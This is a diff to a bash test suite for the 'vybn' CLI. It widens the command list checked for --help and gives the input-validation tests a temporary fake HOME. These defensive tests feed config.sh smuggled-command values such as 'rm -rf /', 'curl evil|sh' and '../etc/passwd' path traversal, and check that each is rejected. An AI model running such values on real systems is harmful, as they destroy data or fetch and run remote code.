@@ -179,7 +179,7 @@ done
 # --- Test: --help flag works for command modules ---
 echo "--- --help per command ---"
 
-commands=(init deploy connect sessions push pull sync-skills start stop destroy status ssh add-key tunnel check switch-network logs update)
+commands=(init deploy connect code sessions push pull sync-skills start stop destroy status ssh add-key keygen tunnel check switch-network logs update ssh-config config ssh-fingerprint redeploy resize snapshot self-update)
 
 for cmd in "${commands[@]}"; do
     help_output="$(
@@ -198,8 +198,11 @@ done
 # --- Test: input validation ---
 echo "--- input validation ---"
 
+# Use a fake HOME to prevent ~/.vybnrc from overriding test values
+_fake_home="$(mktemp -d)"
+
 # Bad VYBN_MACHINE_TYPE
-result="$(VYBN_MACHINE_TYPE="e2;rm -rf /" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
+result="$(VYBN_MACHINE_TYPE="e2;rm -rf /" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" HOME="${_fake_home}" \
     bash -c 'source "${VYBN_DIR}/lib/config.sh"' 2>&1)" && {
     fail "should reject bad VYBN_MACHINE_TYPE"
 } || {
@@ -211,7 +214,7 @@ result="$(VYBN_MACHINE_TYPE="e2;rm -rf /" VYBN_PROJECT="test" VYBN_DIR="${VYBN_R
 }
 
 # Bad VYBN_USER
-result="$(VYBN_USER="root;evil" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
+result="$(VYBN_USER="root;evil" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" HOME="${_fake_home}" \
     bash -c 'source "${VYBN_DIR}/lib/config.sh"' 2>&1)" && {
     fail "should reject bad VYBN_USER"
 } || {
@@ -223,7 +226,7 @@ result="$(VYBN_USER="root;evil" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
 }
 
 # Bad VYBN_TERM
-result="$(VYBN_TERM='xterm;echo pwned' VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
+result="$(VYBN_TERM='xterm;echo pwned' VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" HOME="${_fake_home}" \
     bash -c 'source "${VYBN_DIR}/lib/config.sh"' 2>&1)" && {
     fail "should reject bad VYBN_TERM"
 } || {
@@ -235,7 +238,7 @@ result="$(VYBN_TERM='xterm;echo pwned' VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT
 }
 
 # Bad VYBN_SSHID (path traversal)
-result="$(VYBN_SSHID="../etc/passwd" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
+result="$(VYBN_SSHID="../etc/passwd" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" HOME="${_fake_home}" \
     bash -c 'source "${VYBN_DIR}/lib/config.sh"' 2>&1)" && {
     fail "should reject bad VYBN_SSHID"
 } || {
@@ -247,7 +250,7 @@ result="$(VYBN_SSHID="../etc/passwd" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}"
 }
 
 # Bad VYBN_PROVIDER (path traversal)
-result="$(VYBN_PROVIDER="../etc" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
+result="$(VYBN_PROVIDER="../etc" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" HOME="${_fake_home}" \
     bash -c 'source "${VYBN_DIR}/lib/config.sh"' 2>&1)" && {
     fail "should reject bad VYBN_PROVIDER"
 } || {
@@ -259,7 +262,7 @@ result="$(VYBN_PROVIDER="../etc" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
 }
 
 # Bad VYBN_TOOLCHAINS (injection)
-result="$(VYBN_TOOLCHAINS="node;rm -rf /" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
+result="$(VYBN_TOOLCHAINS="node;rm -rf /" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" HOME="${_fake_home}" \
     bash -c 'source "${VYBN_DIR}/lib/config.sh"' 2>&1)" && {
     fail "should reject bad VYBN_TOOLCHAINS"
 } || {
@@ -271,7 +274,7 @@ result="$(VYBN_TOOLCHAINS="node;rm -rf /" VYBN_PROJECT="test" VYBN_DIR="${VYBN_R
 }
 
 # Bad VYBN_APT_PACKAGES (injection via &&)
-result="$(VYBN_APT_PACKAGES="vim && curl evil|sh" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
+result="$(VYBN_APT_PACKAGES="vim && curl evil|sh" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" HOME="${_fake_home}" \
     bash -c 'source "${VYBN_DIR}/lib/config.sh"' 2>&1)" && {
     fail "should reject bad VYBN_APT_PACKAGES"
 } || {
@@ -283,7 +286,7 @@ result="$(VYBN_APT_PACKAGES="vim && curl evil|sh" VYBN_PROJECT="test" VYBN_DIR="
 }
 
 # Bad VYBN_NPM_PACKAGES (injection via semicolon)
-result="$(VYBN_NPM_PACKAGES="typescript; curl evil" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
+result="$(VYBN_NPM_PACKAGES="typescript; curl evil" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" HOME="${_fake_home}" \
     bash -c 'source "${VYBN_DIR}/lib/config.sh"' 2>&1)" && {
     fail "should reject bad VYBN_NPM_PACKAGES"
 } || {
@@ -295,8 +298,6 @@ result="$(VYBN_NPM_PACKAGES="typescript; curl evil" VYBN_PROJECT="test" VYBN_DIR
 }
 
 # Bad VYBN_VM_NAME (lazy validation via _validate_gcp_params)
-# Use a fake HOME to prevent ~/.vybnrc from overriding test values
-_fake_home="$(mktemp -d)"
 result="$(VYBN_VM_NAME="9invalid" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" HOME="${_fake_home}" \
     bash -c 'source "${VYBN_DIR}/lib/config.sh"; _validate_gcp_params' 2>&1)" && {
     fail "should reject bad VYBN_VM_NAME"
@@ -349,13 +350,11 @@ else
     fail "_resolve_vm_name: ${result}"
 fi
 
-rm -rf "${_fake_home}"
-
 # --- Test: _validate_session_name ---
 echo "--- session name validation ---"
 
 # Valid session name
-result="$(VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
+result="$(VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" HOME="${_fake_home}" \
     bash -c 'source "${VYBN_DIR}/lib/config.sh"; _validate_session_name "myproject" && echo ok' 2>&1)" || true
 if [[ "$result" == "ok" ]]; then
     ok "valid session name accepted"
@@ -364,7 +363,7 @@ else
 fi
 
 # Empty session name
-result="$(VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
+result="$(VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" HOME="${_fake_home}" \
     bash -c 'source "${VYBN_DIR}/lib/config.sh"; _validate_session_name ""' 2>&1)" && {
     fail "should reject empty session name"
 } || {
@@ -376,7 +375,7 @@ result="$(VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
 }
 
 # Session name with colon
-result="$(VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
+result="$(VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" HOME="${_fake_home}" \
     bash -c 'source "${VYBN_DIR}/lib/config.sh"; _validate_session_name "bad:name"' 2>&1)" && {
     fail "should reject session name with colon"
 } || {
@@ -388,7 +387,7 @@ result="$(VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
 }
 
 # Session name with period
-result="$(VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
+result="$(VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" HOME="${_fake_home}" \
     bash -c 'source "${VYBN_DIR}/lib/config.sh"; _validate_session_name "bad.name"' 2>&1)" && {
     fail "should reject session name with period"
 } || {
@@ -402,7 +401,7 @@ result="$(VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
 # --- Test: VYBN_PROJECTS_DIR validation ---
 echo "--- VYBN_PROJECTS_DIR validation ---"
 
-result="$(VYBN_PROJECTS_DIR="relative/path" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" \
+result="$(VYBN_PROJECTS_DIR="relative/path" VYBN_PROJECT="test" VYBN_DIR="${VYBN_ROOT}" HOME="${_fake_home}" \
     bash -c 'source "${VYBN_DIR}/lib/config.sh"' 2>&1)" && {
     fail "should reject relative VYBN_PROJECTS_DIR"
 } || {
@@ -412,6 +411,8 @@ result="$(VYBN_PROJECTS_DIR="relative/path" VYBN_PROJECT="test" VYBN_DIR="${VYBN
         fail "wrong error for relative VYBN_PROJECTS_DIR: ${result}"
     fi
 }
+
+rm -rf "${_fake_home}"
 
 # --- Test: toolchain modules ---
 echo "--- toolchain modules ---"
